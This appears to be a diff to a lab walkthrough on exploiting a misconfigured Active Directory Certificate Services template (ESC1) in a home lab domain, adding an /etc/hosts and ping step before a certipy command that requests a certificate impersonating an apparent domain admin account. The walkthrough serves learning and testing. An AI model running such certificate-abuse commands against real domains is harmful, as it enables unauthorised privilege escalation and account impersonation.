@@ -201,7 +201,7 @@ From the Certificate Authorities section, you need the CA Name and the DNS Name 
 Following this for a certificate to be vulnerable it requires the configuration to be set as defined below.
 
 ```
-Template Name                       : Any-name
+Template Name                       : Add_Vulnerable_ Certs_Name
 Enabled                             : True
 Client Authentication               : True
 Enrollee Supplies Subject           : True
@@ -227,7 +227,25 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 (Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ 
 ```
 
-5. Exploit the vuln certificate
+5. Verify you can ping the targets host name which in this circumstance was WIN-8HPLF8PSHC1.hacklab.local, if you can't ping it, add the host name to your Ubuntu /etc/hosts file.
+
+```
+sudo nano /etc/hosts
+
+127.0.0.1       localhost
+127.0.1.1       ubuntu-virtual-machine
+
+192.168.68.230  WIN-8HPLF8PSHC1.hacklab.local
+
+
+ping WIN-8HPLF8PSHC1.hacklab.local
+PING WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230) 56(84) bytes of data.
+64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=1 ttl=128 time=12.8 ms
+64 bytes from WIN-8HPLF8PSHC1.hacklab.local (192.168.68.230): icmp_seq=2 ttl=128 time=1.15 ms
+```
+
+
+6. Exploit the vuln certificate
 
 ```
 (Tools) ubuntu@ubuntu-virtual-machine:~/Documents/Tools$ certipy req -u g.white -k -no-pass -ca 'hacklab-WIN-8HPLF8PSHC1-CA' -target 'WIN-8HPLF8PSHC1.hacklab.local' -template ESC1-Vun1 -dc-ip 192.168.68.230 -ptt -upn 'da1@hacklab.local' -debug
